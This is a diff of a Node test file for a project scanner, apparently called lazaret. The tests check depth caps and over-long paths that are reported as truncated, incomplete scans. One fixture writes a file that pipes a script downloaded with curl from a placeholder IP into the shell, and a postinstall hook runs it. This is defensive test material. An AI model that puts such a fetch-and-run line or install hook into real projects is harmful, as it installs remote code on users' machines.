@@ -6,7 +6,7 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import {
-  mkdtempSync, writeFileSync, mkdirSync, rmSync, readFileSync, symlinkSync, chmodSync,
+  mkdtempSync, writeFileSync, mkdirSync, rmSync, readFileSync, symlinkSync, chmodSync, unlinkSync, rmdirSync,
 } from "node:fs";
 import { execFileSync, spawnSync } from "node:child_process";
 import { tmpdir } from "node:os";
@@ -14,6 +14,9 @@ import { join, sep, dirname } from "node:path";
 import { fileURLToPath } from "node:url";
 import { run, collectFiles } from "../src/index.js";
 import { isLink, dirKey } from "../src/lib/fs.js";
+import { MAX_WALK_DEPTH, TOO_LONG_WHY } from "../src/lib/collect.js";
+import { projectHookChecks } from "../src/deps.js";
+import { scanManifest } from "../src/lib/supplychain.js";
 
 const POSIX = process.platform !== "win32";
 const BIN = fileURLToPath(new URL("../bin/lazaret.js", import.meta.url));
@@ -280,7 +283,7 @@ test("a directory's identity keeps all 64 bits of a Windows file ID", () => {
   assert.equal(dirKey({ dev: 7n, ino: 0n }), null);          // no inode numbers: no loop check
 });
 
-test("the walk is iterative: a very deep tree is scanned without recursion", (t) => {
+test("the walk is iterative: a very deep tree is scanned without recursion, to the depth cap", (t) => {
   const d = mkdtempSync(join(tmpdir(), "lazaret-deep-"));
   try {
     const parts = Array(600).fill("d");
@@ -294,8 +297,83 @@ test("the walk is iterative: a very deep tree is scanned without recursion", (t)
       return;
     }
     writeFileSync(join(d, ...parts, "x.js"), "eval(y)\n");
+    // the walk enters no folder deeper than MAX_WALK_DEPTH (512, core.MAX_WALK_DEPTH's twin: LZ-03's review): a file in
+    // the 512th folder is read, the 513th folder is SC-TRUNCATED and the result incomplete, as the Python CLI's
+    const last = parts.slice(0, MAX_WALK_DEPTH);
+    writeFileSync(join(d, ...last, "deep.js"), "eval(y)\n");
     const col = collectFiles(d);
-    assert.equal(col.files.length, 1, JSON.stringify(col.binaryIssues.map((i) => i.msg)));
-    assert.equal(col.files[0].path, P(...parts, "x.js"));
+    assert.deepEqual(col.files.map((f) => f.path), [P(...last, "deep.js")]);
+    assert.deepEqual(col.tooDeep, [P(...parts.slice(0, MAX_WALK_DEPTH + 1))]);
+    assert.deepEqual(col.binaryIssues.map((i) => [i.rule, i.file, i.msg]), [["SC-TRUNCATED",
+      P(...parts.slice(0, MAX_WALK_DEPTH + 1)), "File not fully scanned: it is nested deeper than 512 folders, so it was "
+      + "not read."]]);
+    const r = scan(d);
+    assert.equal(r.rep.incomplete, true);
+    assert.equal(r.rep.incompleteReason, "1 folder nested deeper than 512 folders was not read");
   } finally { cleanup(d); }
 });
+
+/** d/N/N/…/N (`depth` folders named `name`), `leaf` written in the deepest: made a folder at a time from the one
+ * before (the process's working folder), so the paths' length never matters; `remove` takes it down the same way. */
+function longTree(d, depth, name, leaf, text) {
+  const back = process.cwd();
+  try {
+    process.chdir(d);
+    for (let k = 0; k < depth; k++) { mkdirSync(name); process.chdir(name); }
+    writeFileSync(leaf, text);
+  } finally { process.chdir(back); }
+}
+function removeLongTree(d, depth, name, leaf) {
+  const back = process.cwd();
+  try {
+    process.chdir(d);
+    for (let k = 0; k < depth; k++) process.chdir(name);
+    rmSync(leaf, { force: true });
+    for (let k = 0; k < depth; k++) { process.chdir(".."); rmdirSync(name); }
+  } finally { process.chdir(back); }
+  cleanup(d);
+}
+
+test("a folder or a file whose path is too long for the system is SC-TRUNCATED and the scan incomplete (LZ-03's re-check)",
+  { skip: !POSIX }, () => {
+    // (the walk and the readers after it go by path: once a path is longer than PATH_MAX, 4,096 bytes on Linux and
+    // 1,024 on macOS, it can't be listed or read. That was one Q-UNREADABLE note in a complete result, the file at the
+    // bottom unread; the Python CLI, beneath descriptors, reads such a tree whole below the depth cap. The root is 400
+    // characters deep and the tree 360 folders of 10: a hook's path below the root stays under the 4,096 characters the
+    // engine follows, the full path over the system's limit)
+    const name = "n".repeat(10), depth = 360, base = mkdtempSync(join(tmpdir(), "lazaret-long-"));
+    const d = join(base, "p".repeat(200), "q".repeat(200));
+    try {
+      mkdirSync(d, { recursive: true });
+      writeFileSync(join(d, "a.py"), "x = 1\n");
+      longTree(d, depth, name, "leaf.js", "require('child_process').execSync('curl -s https://198.51.100.7/p.sh | sh');\n");
+      const col = collectFiles(d);
+      assert.deepEqual(col.files.map((f) => f.path), ["a.py"]);
+      assert.equal(col.tooLong.length, 1);
+      const rel = col.tooLong[0], k = rel.split(sep).length;
+      assert.equal(rel, P(...Array(k).fill(name)));
+      assert.ok(k < depth && (d + sep + rel).length > 1000, rel.length);
+      assert.deepEqual(col.binaryIssues.map((i) => [i.rule, i.file, i.msg]), [["SC-TRUNCATED", rel,
+        `File not fully scanned: ${TOO_LONG_WHY}.`]]);
+      const r = scan(d);
+      assert.equal(r.rep.incomplete, true);
+      assert.equal(r.rep.incompleteReason, "1 folder or file was not read: its path is longer than this system allows");
+      assert.deepEqual(r.keys, ["SC-TRUNCATED " + rel]);
+      // the readers after the walk: the project's postinstall runs that file (a CRITICAL where it can be read); the
+      // hook's reader notes the same folder (one part), and the result is incomplete, the CRITICAL not claimed
+      const hook = [...Array(depth).fill(name), "leaf.js"].join("/");
+      writeFileSync(join(d, "package.json"), JSON.stringify({ name: "x", version: "1.0.0",
+        scripts: { postinstall: `node ${hook}` } }));
+      const c2 = collectFiles(d);
+      const hooks = scanManifest("package.json", readFileSync(join(d, "package.json"), "utf8"))
+        .filter((i) => i.rule === "SC-INSTALL-HOOK");
+      const tooLong = [];
+      projectHookChecks(d, c2.files, c2.manifests, hooks, { tooLong });
+      assert.deepEqual([...new Set(tooLong)], [rel]);
+      const { rep } = scan(d);
+      assert.equal(rep.incomplete, true);
+      assert.equal(rep.incompleteReason, "1 folder or file was not read: its path is longer than this system allows");
+      assert.deepEqual(rep.issues.map((i) => [i.rule, i.sev, i.file]).sort(), [["SC-INSTALL-HOOK", "MAJOR",
+        "package.json"], ["SC-TRUNCATED", "CRITICAL", rel]]);
+    } finally { removeLongTree(d, depth, name, "leaf.js"); cleanup(base); }
+  });
